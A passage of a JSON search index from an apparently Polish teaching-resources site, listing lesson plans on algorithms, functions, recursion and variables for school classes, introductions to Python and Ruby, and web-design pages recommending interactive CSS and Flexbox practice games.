pomini\u0119ciu lekcji IV. Lekcja III winna by\u0107 zrealizowana w ka\u017cdym przypadku, ewentualnie bez implementacji metody lewej r\u0119ki. W klasach m\u0142odszych nie nale\u017cy wchodzi\u0107 w abstrakcyjne uog\u00f3lnienia (zawarte w ko\u0144cowych slajdach prezentacji do lekcji III). </li> <li>Gor\u0105co zach\u0119camy do anga\u017cowania uczni\u00f3w w dyskusj\u0119, szczeg\u00f3lnie podczas lekcji wprowadzaj\u0105cej.</li> </ol>"},{"location":"topics/algorithms-introduction/#wskazania-do-realizacji","title":"Wskazania do realizacji","text":"<ul> <li>Lekcje powinny odby\u0107 si\u0119 w r\u00f3\u017cnych dniach.</li> <li>Zadanie 9. (lekcja II) nale\u017cy potraktowa\u0107 opcjonalnie - zrealizowa\u0107 w miar\u0119 mo\u017cliwo\u015bci.</li> <li>Lekcj\u0119 4, ze wzgl\u0119du na jej ewaluacyjny charakter, nale\u017cy potraktowa\u0107 podobnie do sprawdzianu.</li> </ul> <p> Protok\u00f3\u0142 realizacji projektu</p>"},{"location":"topics/algorithms-introduction/lesson-1/","title":"Lekcja 1","text":"<p>Celem tej lekcji jest poznanie nast\u0119puj\u0105cych zagadnie\u0144:</p> <ol> <li>Algorytm liniowy</li> <li>Instrukcja warunkowa</li> <li>P\u0119tla warunkowa</li> <li>P\u0119tla liczona</li> </ol>"},{"location":"topics/algorithms-introduction/lesson-1/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja</p> <p> Dyspozycje do dyskusji</p>"},{"location":"topics/algorithms-introduction/lesson-2/","title":"Lekcja 2","text":"<p>Na tej lekcji uczniowie wykorzystuj\u0105 w praktyce wiedz\u0119 zdobyt\u0105 na pierwszej lekcji. Wykorzystuj\u0105c Google Blockly uczniowie rozwi\u0105zuj\u0105 kolejne zadania polegaj\u0105ce na skonstruowaniu algorytmu pozwalaj\u0105cego dotrze\u0107 do punktu docelowego w labiryncie.</p> <p>Gry Blockly: https://blockly.games/?lang=pl</p> <p>Blockly Labirynt: https://blockly.games/maze?lang=pl</p> <p>Blockly Ptak: https://blockly.games/bird?lang=pl</p>"},{"location":"topics/algorithms-introduction/lesson-2/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Blockly Labirynt - prezentacja rozwi\u0105za\u0144</p> <p> Blockly Ptak - prezentacja rozwi\u0105za\u0144</p>"},{"location":"topics/algorithms-introduction/lesson-3/","title":"Lekcja 3","text":"<p>Na tej lekcji uczniowie rozwi\u0105zuj\u0105 z\u0142o\u017cony problem: znalezienie wyj\u015bcia z labiryntu. Zaczynamy od narysowania \u015bcie\u017cki na kartce. Proste zadanie, nawet dla ma\u0142ych dzieci, ale czy komputer te\u017c sobie z tym poradzi? Krok po kroku, rozwa\u017caj\u0105c r\u00f3\u017cne sytuacje, na jakie mo\u017cemy natrafi\u0107 podczas przechodzenia przez labirynt, konstruujemy algorytm - metod\u0119 lewej r\u0119ki. Zwie\u0144czeniem lekcji jest implementacja algorytmu jako rozwi\u0105zania zadania 10 z gry Blockly - Labirynt.</p>"},{"location":"topics/algorithms-introduction/lesson-3/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Karty pracy - labirynt</p> <p> Prezentacja - metoda lewej r\u0119ki</p>"},{"location":"topics/algorithms-introduction/lesson-4/","title":"Lekcja 4","text":"<p>Podczas tej lekcji uczniowie staj\u0105 przed zadaniem zaimplementowania algorytmu znajduj\u0105cego drog\u0119 przez labirynt. Jest jednak pewien haczyk: po drodze do wyj\u015bcia nale\u017cy zebra\u0107 klucz. Co wi\u0119cej, algorytm musi dzia\u0142a\u0107 poprawnie bez \u017cadnych zmian dla dw\u00f3ch zadanych labirynt\u00f3w.</p>"},{"location":"topics/algorithms-introduction/lesson-4/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - zadanie</p>"},{"location":"topics/functions-introduction/","title":"Wprowadzenie do funkcji","text":""},{"location":"topics/functions-introduction/#sugestie-dla-nauczycieli","title":"Sugestie dla nauczycieli","text":"<ol> <li>Temat przeznaczony jest na klas\u0119 VI-VII szko\u0142y podstawowej. Powinien by\u0107 zrealizowany w klasie, w kt\u00f3rej zosta\u0142y ju\u017c przeprowadzone zaj\u0119cia zwi\u0105zane z programowaniem. Do poprawnego przyswojenia tematu wymagane jest rozumienie takich poj\u0119\u0107 jak: algorytm, instrukcja warunkowa, p\u0119tla.</li> </ol>"},{"location":"topics/functions-introduction/#wskazania-do-realizacji","title":"Wskazania do realizacji","text":"<ul> <li>Lekcja 3 nieznacznie odbiega od tematu funkcji, wprowadzaj\u0105c poj\u0119cie globalno\u015bci i lokalno\u015bci zmiennych.</li> <li>Lekcja 4 jest lekcj\u0105 ewaluacyjn\u0105 i obejmuje zadanie zar\u00f3wno na kartce jak i zadanie implementacyjne przy komputerze.</li> </ul> <p> Protok\u00f3\u0142 realizacji projektu</p>"},{"location":"topics/functions-introduction/lesson-1/","title":"Lekcja 1","text":""},{"location":"topics/functions-introduction/lesson-1/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - funkcje</p> <p> Prezentacja - \u0107wiczenie</p> <p> \u0106wiczenie - opis</p>"},{"location":"topics/functions-introduction/lesson-2/","title":"Lekcja 2","text":""},{"location":"topics/functions-introduction/lesson-2/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - zadania</p> <p> Rozwi\u0105zania - C++</p> <p> Rozwi\u0105zania - Python</p>"},{"location":"topics/functions-introduction/lesson-3/","title":"Lekcja 3","text":""},{"location":"topics/functions-introduction/lesson-3/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - globalno\u015b\u0107 i lokalno\u015b\u0107</p>"},{"location":"topics/functions-introduction/lesson-4/","title":"Lekcja 4","text":""},{"location":"topics/functions-introduction/lesson-4/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - NWW i NWD</p> <p> Rozwi\u0105zania</p>"},{"location":"topics/functions-introduction/lesson-5/","title":"Lekcja 5","text":""},{"location":"topics/functions-introduction/lesson-5/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - zadania</p> <p> Zadanie 2 - dane</p> <p> Prezentacja - rozwi\u0105zania</p> <p> Zadanie 2 - rozwi\u0105zanie</p>"},{"location":"topics/programming/","title":"Tematy techniczne","text":"<p>Tutaj znajduj\u0105 si\u0119 pozosta\u0142e tematy, kt\u00f3re dotycz\u0105 g\u0142\u00f3wnie zagadnie\u0144 technicznych/programistycznych i mog\u0142y zosta\u0107 opracowane w troch\u0119 odmienny spos\u00f3b. Znajduj\u0105 si\u0119 tutaj tak\u017ce tematy, kt\u00f3re nie s\u0105 zawarte w podstawie programowej. Niemniej wci\u0105\u017c dostarczamy pe\u0142ny komplet: konspekt, prezentacj\u0119 i dodatkowe materia\u0142y.</p>"},{"location":"topics/programming/python-introduction/","title":"Wprowadzenie do j\u0119zyka Python 3","text":"<p> Konspekt</p> <p> Prezentacja</p> <p> Kody \u017ar\u00f3d\u0142owe</p>"},{"location":"topics/programming/ruby-introduction/","title":"Wprowadzenie do j\u0119zyka Ruby","text":"<p> Konspekt</p> <p> Prezentacja</p> <p> Kody \u017ar\u00f3d\u0142owe</p>"},{"location":"topics/programming/ruby-on-rails-introduction/","title":"Wprowadzenie do Ruby on Rails","text":"<p> Konspekt</p> <p> Prezentacja</p>"},{"location":"topics/recursion-introduction/","title":"Wprowadzenie do rekurencji","text":""},{"location":"topics/recursion-introduction/#sugestie-dla-nauczycieli","title":"Sugestie dla nauczycieli","text":"<ol> <li>Temat w \u017cadnym wypadku nie powinien by\u0107 realizowany wcze\u015bniej ni\u017c w klasie VIII szko\u0142y podstawowej. Optymalny wydaje si\u0119 poziom I klasy liceum. Zalecamy uprzednie staranne zbadanie stanu gotowo\u015bci uczni\u00f3w.</li> <li>Gor\u0105co zach\u0119camy do przygotowania zestaw\u00f3w pude\u0142ek wykorzystywanych na lekcji 1 (minimalnie jeden zestaw, najlepiej po zestawie dla nauczyciela i ka\u017cdej z grup (ok. 5 os\u00f3b) uczni\u00f3w). Zestawy powinny obowi\u0105zkowo odzwierciedla\u0107 uk\u0142ad z odpowiednich prezentacji. Podczas \u0107wiczenia samodzielnego, uczniowie powinni najpierw spr\u00f3bowa\u0107 samodzielnie (w grupach) prze\u015bledzi\u0107 dzia\u0142anie algorytmu i spisa\u0107 wykonywane instrukcje a tak\u017ce zmiany na stosie, a dopiero potem sprawdzi\u0107 poprawno\u015b\u0107 rozwi\u0105zania wsp\u00f3lnie z nauczycielem.</li> <li>W przypadku realizacji na poziomie wy\u017cszym ni\u017c I klasa liceum opracowany temat \u0142atwo daje si\u0119 rozszerzy\u0107 na trudniejsze problemy (w szczeg\u00f3lno\u015bci na problemy grafowe).</li> <li>Na lekcji pierwszej podczas omawiania zadania domowego (zadanie z ma\u0142p\u0105) nale\u017cy zwr\u00f3ci\u0107 uwag\u0119 na to, \u017ce nie musimy zna\u0107 budowy (struktury) drzewa, aby zrealizowa\u0107 algorytm. Wystarczy nam informacja, \u017ce jest to drzewo, na kt\u00f3rym znajduje si\u0119 dok\u0142adnie jeden banan i da si\u0119 do niego dotrze\u0107 chodz\u0105c po ga\u0142\u0119ziach. Podobnie w przypadku zadania z pude\u0142kami, tak\u017ce nie musieli\u015bmy zna\u0107 uk\u0142adu pude\u0142ek, aby wykona\u0107 algorytm.</li> <li>Prezentacja do lekcji 4 zawiera kilka wskaz\u00f3wek dla uczni\u00f3w, kt\u00f3re maj\u0105 pom\u00f3c rozwi\u0105za\u0107 zadanie. Nauczyciel powinien oceni\u0107 poziom klasy i pokaza\u0107 te wskaz\u00f3wki jedynie wtedy, gdy wyda si\u0119 to konieczne.</li> <li>Do zadania na lekcji 4 mo\u017cna tak\u017ce doda\u0107 polecenie zaprezentowania dzia\u0142ania zaproponowanego algorytmu na podanym labiryncie \u2013 podobnie jak by\u0142o to pokazywane w zadaniu z pude\u0142kami, czy te\u017c w zadaniu z ma\u0142p\u0105.</li> </ol>"},{"location":"topics/recursion-introduction/#wskazania-do-realizacji","title":"Wskazania do realizacji","text":"<ul> <li>Lekcja 1 powinna odby\u0107 si\u0119 w innym, poprzedzaj\u0105cym dniu ni\u017c pozosta\u0142e.</li> <li>Dopuszczalne, a nawet korzystne jest zrealizowanie lekcji 2 i lekcji 3 jednego dnia.</li> <li>Lekcja 4 jest najmniej zale\u017cna od pozosta\u0142ych. Ze wzgl\u0119du na jej ewaluacyjny charakter wymagane jest traktowanie jej podobnie jak sprawdzianu.</li> </ul> <p> Protok\u00f3\u0142 realizacji projektu</p>"},{"location":"topics/recursion-introduction/lesson-1/","title":"Lekcja 1","text":""},{"location":"topics/recursion-introduction/lesson-1/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - rekurencja</p> <p> Prezentacja - pude\u0142ka</p> <p> Prezentacja - sprawd\u017a pude\u0142ka</p> <p> Prezentacja - sprawd\u017a inne pude\u0142ka</p> <p> Prezentacja - zadanie z ma\u0142p\u0105</p> <p> Karta pracy - zadanie z ma\u0142p\u0105</p>"},{"location":"topics/recursion-introduction/lesson-2/","title":"Lekcja 2","text":""},{"location":"topics/recursion-introduction/lesson-2/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - rozwi\u0105zanie zadania z ma\u0142p\u0105</p> <p> Prezentacja - Blockly \u017b\u00f3\u0142w</p> <p> Prezentacja - funkcje w Blockly \u017b\u00f3\u0142w</p>"},{"location":"topics/recursion-introduction/lesson-3/","title":"Lekcja 3","text":""},{"location":"topics/recursion-introduction/lesson-3/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - fraktale</p> <p> Prezentacja - drzewo binarne</p> <p> Prezentacja - drzewo binarne - algorytm</p>"},{"location":"topics/recursion-introduction/lesson-4/","title":"Lekcja 4","text":""},{"location":"topics/recursion-introduction/lesson-4/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - zadanie</p> <p> Prezentacja - rozwi\u0105zanie</p>"},{"location":"topics/variables-introduction/","title":"Wprowadzenie do zmiennych","text":"<p>Bez zmiennych ci\u0119\u017cko wyobrazi\u0107 sobie programowanie. Ich dobre zrozumienie jest kluczowe, je\u017celi chcemy m\u00f3wi\u0107 o ciekawszych i bardziej z\u0142o\u017conych algorytmach. Zrozumienie zmiennych potrafi jednak nieraz sprawia\u0107 du\u017ce problemy, kt\u00f3re mog\u0105 ujawni\u0107 si\u0119 dopiero po d\u0142u\u017cszym czasie.</p>"},{"location":"topics/variables-introduction/#sugestie-dla-nauczycieli","title":"Sugestie dla nauczycieli","text":"<ol> <li>Optymalnym wydaje si\u0119 realizowanie tematu nie p\u00f3\u017aniej ni\u017c w V klasie szko\u0142y podstawowej, chocia\u017c temat wydaje si\u0119 tak\u017ce mo\u017cliwy do zrealizowania nawet na wcze\u015bniejszych etapach.  </li> <li>Do \u0107wiczenia na lekcji pierwszej nale\u017cy przygotowa\u0107 odpowiednie materia\u0142y:</li> <li>Zestaw pude\u0142ek reprezentuj\u0105cych trzy zmienne: A, B oraz C. Pude\u0142ka powinny by\u0107 otwarte od g\u00f3ry, tak by mo\u017cna by\u0142o do nich \u0142atwo zajrze\u0107.</li> <li>Zestaw zmiennych: wydrukowanych i poci\u0119tych kartek z obrazkami jab\u0142ka i gruszki.</li> <li>Pude\u0142ko reprezentuj\u0105ce ksero \u2013 w nim trzymamy \u201ekopie\u201d zmiennych.</li> <li>Do \u0107wiczenia na drugiej lekcji nale\u017cy przygotowa\u0107 odpowiednie materia\u0142y:</li> <li>D\u0142ugie pude\u0142ko z przegr\u00f3dkami - co najmniej 9 przegr\u00f3dek</li> <li>Plastikowe kubeczki - bia\u0142e lub prze\u017aroczyste, co najmniej tyle co przegr\u00f3dek w pude\u0142ku</li> <li>Spinacze</li> <li>Karteczki:<ul> <li>Niewielkie, do przypi\u0119cia do kubeczk\u00f3w, z warto\u015bciami od 0 do 9. Ka\u017cda warto\u015b\u0107 powinna wyst\u0105pi\u0107 co najmniej tyle razy, ile jest przegr\u00f3dek.</li> <li>\u015arednich rozmiar\u00f3w, z warto\u015bciami P1, P2, P3,..., P9, do ponumerowania przegr\u00f3dek w pude\u0142ku.</li> <li>Kilkana\u015bcie w\u0105skich karteczek o d\u0142ugo\u015bci trzech przegr\u00f3dek, do oznaczania zmiennych w modelu.</li> <li>Kilka w\u0105skich karteczek o d\u0142ugo\u015bci sze\u015bciu przegr\u00f3dek, do oznaczania po\u0142o\u017cenia zmiennych w modelu.</li> </ul> </li> </ol>"},{"location":"topics/variables-introduction/#wskazania-do-realizacji","title":"Wskazania do realizacji","text":"<ul> <li>Lekcj\u0119 2 warto jest zrealizowa\u0107 tego samego dnia co lekcj\u0119 1.</li> <li>Lekcj\u0119 4 nale\u017cy zrealizowa\u0107 innego dnia, ni\u017c lekcje 1, 2 i 3.</li> <li>Lekcj\u0119 4, ze wzgl\u0119du na jej ewaluacyjny charakter, nale\u017cy potraktowa\u0107 podobnie do sprawdzianu.</li> </ul> <p> Protok\u00f3\u0142 realizacji projektu</p>"},{"location":"topics/variables-introduction/lesson-1/","title":"Lekcja 1","text":""},{"location":"topics/variables-introduction/lesson-1/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - zmienne</p> <p> Prezentacja - \u0107wiczenia</p> <p> Do druku</p>"},{"location":"topics/variables-introduction/lesson-2/","title":"Lekcja 2","text":""},{"location":"topics/variables-introduction/lesson-2/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Opis \u0107wiczenia</p> <p> Prezentacja - zmienne w pami\u0119ci</p>"},{"location":"topics/variables-introduction/lesson-3/","title":"Lekcja 3","text":""},{"location":"topics/variables-introduction/lesson-3/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - \u0107wiczenia Blockly</p> <p> Rozwi\u0105zania \u0107wicze\u0144 - Python</p>"},{"location":"topics/variables-introduction/lesson-4/","title":"Lekcja 4","text":""},{"location":"topics/variables-introduction/lesson-4/#materiay","title":"Materia\u0142y","text":"<p> Konspekt</p> <p> Prezentacja - zadania</p>"},{"location":"web-design/","title":"Tworzenie stron internetowych","text":"<p>Strona internetowa to zbi\u00f3r powi\u0105zanych ze sob\u0105 stron WWW, dost\u0119pnych w Internecie pod jednym adresem URL, kt\u00f3re zawieraj\u0105 tre\u015bci tekstowe, graficzne, multimedialne itp. Tworzenie stron internetowych polega na kombinowaniu tych element\u00f3w w taki spos\u00f3b, aby przekaza\u0107 konkretne informacje lub zapewni\u0107 okre\u015blone do\u015bwiadczenie u\u017cytkownikowi.</p> <p>Tworzenie stron internetowych mo\u017ce mie\u0107 r\u00f3\u017cne cele, takie jak informowanie, edukowanie, sprzeda\u017c produkt\u00f3w lub us\u0142ug, budowanie spo\u0142eczno\u015bci wok\u00f3\u0142 konkretnego tematu czy te\u017c promowanie siebie czy swojej marki.</p>"},{"location":"web-design/#podstawowe-skadniki-strony-internetowej","title":"Podstawowe sk\u0142adniki strony internetowej","text":"<ul> <li>Tre\u015b\u0107: tekst, grafika, multimedia.</li> <li>Struktura i nawigacja: spos\u00f3b organizacji i prezentacji tre\u015bci.</li> <li>Wygl\u0105d: kolory, czcionki, uk\u0142ad, grafika.</li> <li>Interaktywno\u015b\u0107: formularze, animacje, skrypty.</li> </ul>"},{"location":"web-design/#technologie-i-narzedzia","title":"Technologie i narz\u0119dzia","text":"<ul> <li>HTML (HyperText Markup Language): j\u0119zyk u\u017cywany do strukturyzowania tre\u015bci na stronie.</li> <li>CSS (Cascading Style Sheets): s\u0142u\u017cy do opisu wygl\u0105du element\u00f3w na stronie.</li> <li>JavaScript: j\u0119zyk programowania u\u017cywany do dodawania interaktywno\u015bci na stronie.</li> <li>Frameworki i biblioteki: zestawy narz\u0119dzi u\u0142atwiaj\u0105ce rozw\u00f3j (np. Bootstrap, jQuery).</li> <li>Systemy zarz\u0105dzania tre\u015bci\u0105 (CMS): narz\u0119dzia, kt\u00f3re pozwalaj\u0105 na \u0142atwe zarz\u0105dzanie tre\u015bci\u0105 na stronie bez g\u0142\u0119bokiej wiedzy technicznej (np. WordPress, Joomla).</li> </ul>"},{"location":"web-design/#planowanie-strony-internetowej","title":"Planowanie strony internetowej","text":"<p>Zanim zaczniesz tworzy\u0107 stron\u0119, warto odpowiedzie\u0107 sobie na kilka kluczowych pyta\u0144:</p> <ul> <li>Dla kogo jest ta strona? Okre\u015bl grup\u0119 docelow\u0105.</li> <li>Jaki jest g\u0142\u00f3wny cel strony? Sprzeda\u017c, informacja, edukacja itp.</li> <li>Jakie tre\u015bci b\u0119d\u0105 prezentowane? Teksty, zdj\u0119cia, filmy, blog, sklep.</li> <li>Jakie funkcjonalno\u015bci b\u0119d\u0105 potrzebne? Formularz kontaktowy, galeria zdj\u0119\u0107, chat online.</li> </ul>"},{"location":"web-design/#responsive-web-design-rwd","title":"Responsive Web Design (RWD)","text":"<p>W dzisiejszych czasach kluczowe jest, aby strona by\u0142a dostosowana do wy\u015bwietlania na r\u00f3\u017cnych urz\u0105dzeniach - od komputer\u00f3w stacjonarnych, przez laptopy, tablety, a\u017c po smartfony. Projektowanie responsywne polega na tworzeniu stron, kt\u00f3re dynamicznie dostosowuj\u0105 si\u0119 do rozmiaru ekranu, na kt\u00f3rym s\u0105 wy\u015bwietlane.</p>"},{"location":"web-design/#optymalizacja-i-seo","title":"Optymalizacja i SEO","text":"<p>Aby strona by\u0142a skuteczna, nie tylko musi by\u0107 estetyczna i u\u017cyteczna, ale r\u00f3wnie\u017c musi by\u0107 \u0142atwo znaleziona w wynikach wyszukiwania. Optymalizacja pod k\u0105tem wyszukiwarek (SEO) polega na dostosowywaniu tre\u015bci i struktury strony, aby by\u0142a \"przyjazna\" dla wyszukiwarek i osi\u0105ga\u0142a wysokie pozycje w wynikach wyszukiwania.</p>"},{"location":"web-design/css/","title":"CSS","text":"<p>CSS: Cascading Style Sheet, czyli kaskadowe arkusze styl\u00f3w. S\u0142u\u017c\u0105 do nadawania styl\u00f3w wygl\u0105du poszczeg\u00f3lnym elementom strony HTML. Innymi s\u0142owy za pomoc\u0105 regu\u0142 CSS mo\u017cemy sprawi\u0107, \u017ceby nasza strona wygl\u0105da\u0142a zjawiskowo (albo po prostu \u0142adnie, co kto woli).</p>"},{"location":"web-design/css/#ciekawe-strony-z-interaktywnymi-cwiczeniami","title":"Ciekawe strony z interaktywnymi \u0107wiczeniami","text":""},{"location":"web-design/css/#css-diner","title":"CSS Diner","text":"<p>Idealne miejsce do prze\u0107wiczenia korzystania z selektor\u00f3w CSS. Na stronie znajduj\u0105 si\u0119 32 zadania o rosn\u0105cym poziomie trudno\u015bci, poruszaj\u0105ce takie tematy jak: identyfikatory, klasy, potomkowie, atrybuty. Ka\u017cde \u0107wiczenie posiada kr\u00f3tki opis i przyk\u0142ady (w j\u0119zyku angielskim). Same zadania polegaj\u0105 na wyborze odpowiednich element\u00f3w ze sto\u0142u za pomoc\u0105 odpowiednich selektor\u00f3w CSS.</p>"},{"location":"web-design/css/#zalety","title":"Zalety","text":"<ul> <li>32 zadania o rosn\u0105cym poziomie trudno\u015bci.</li> <li>Mo\u017cliwo\u015b\u0107 wyboru dowolnego zadania.</li> <li>Prosty i intuicyjny interfejs.</li> <li>Intuicyjna wizualizacja dzia\u0142ania selektor\u00f3w CSS.</li> <li>Nie wymaga logowania.</li> </ul>"},{"location":"web-design/css/#wady","title":"Wady","text":"<ul> <li>Dost\u0119pne jedynie w j\u0119zyku angielskim.</li> </ul> <p>CSS Diner</p>"},{"location":"web-design/css/#flexbox-froggy","title":"Flexbox Froggy","text":"<p>Gdy chcemy uporz\u0105dkowa\u0107 elementy w kontenerze na stronie za pomoc\u0105 regu\u0142 CSS, to flexbox jest generalnie dobrym rozwi\u0105zaniem. Za jego pomoc\u0105 mo\u017cemy bez problemu wyr\u00f3wna\u0107 elementy w poziomie i pionie wedle naszych wymaga\u0144. Flexbox Froggy poprzez \u0107wiczenia polegaj\u0105ce na przemieszczaniu \u017cab na li\u015bcie lilii wodnych pozwala na poznanie regu\u0142 CSS zwi\u0105zanych z tym zagadnieniem.</p>"},{"location":"web-design/css/#zalety_1","title":"Zalety","text":"<ul> <li>24 zadanie o rosn\u0105cym poziomie trudno\u015bci.</li> <li>Mo\u017cliwo\u015b\u0107 wyboru dowolnego zadania.</li> <li>Prosty i intuicyjny interfejs.</li> <li>Intuicyjna wizualizacja dzia\u0142ania regu\u0142 CSS.</li> <li>Nie wymaga logowania.</li> <li>Dost\u0119pne w j\u0119zyku polskim.</li> </ul>"},{"location":"web-design/css/#wady_1","title":"Wady","text":"<ul> <li>Nie stwierdzono.</li> </ul> <p>Flexbox Froggy</p>"},{"location":"web-design/css/#flexbox-defense","title":"Flexbox Defense","text":"<p>Podobnie jak Flexbox Froggy, Flexbox Defense tak\u017ce pozwala pozna\u0107 i prze\u0107wiczy\u0107 korzystanie z regu\u0142 CSS zwi\u0105zanych z umieszczaniem element\u00f3w na stronie. Flexbox Defense jest rodzajem gry z gatunku tower defense, gdzie naszym zadaniem jest takie rozmieszczenie wie\u017c obronnych, by pokona\u0107 fale nadci\u0105gaj\u0105cych wrog\u00f3w.</p>"},{"location":"web-design/css/#zalety_2","title":"Zalety","text":"<ul> <li>12 zada\u0144 o rosn\u0105cym poziomie trudno\u015bci.</li> <li>Mo\u017cliwo\u015b\u0107 wyboru dowolnego zadania.</li> <li>Prosty i intuicyjny interfejs.</li> <li>Intuicyjna wizualizacja dzia\u0142ania regu\u0142 CSS.</li> <li>Nie wymaga logowania.</li> <li>Anga\u017cuj\u0105ce \u0107wiczenia.</li> </ul>"},{"location":"web-design/css/#wady_2","title":"Wady","text":"<ul> <li>Dost\u0119pne jedynie w j\u0119zyku angielskim.</li> </ul> <p>Flexbox Defense</p>"},{"location":"web-design/css/#flex-box-adventure","title":"Flex Box Adventure","text":"<p>Kolejna gra wprowadzaj\u0105ca nas do regu\u0142 CSS Flexbox. Tym razem naszym zadaniem jest pokierowanie dzielnym rycerzem podczas jego niebezpiecznej przygody.</p>"},{"location":"web-design/css/#zalety_3","title":"Zalety","text":"<ul> <li>24 anga\u017cuj\u0105ce zadania o rosn\u0105cym poziomie trudno\u015bci.</li> <li>3 poziomy trudno\u015bci.</li> <li>Bogate opisy prezentowanych regu\u0142 CSS z przyk\u0142adami.</li> </ul>"},{"location":"web-design/css/#wady_3","title":"Wady","text":"<ul> <li>Dost\u0119pne jedynie w j\u0119zyku angielskim.</li> <li>Zadania trzeba odblokowywa\u0107 w ustalonej kolejno\u015bci.</li> <li>Mo\u017ce by\u0107 lekko przyt\u0142aczaj\u0105ce dla pocz\u0105tkowych u\u017cytkownik\u00f3w.</li> </ul> <p>Flex Box Adventure</p>"}]}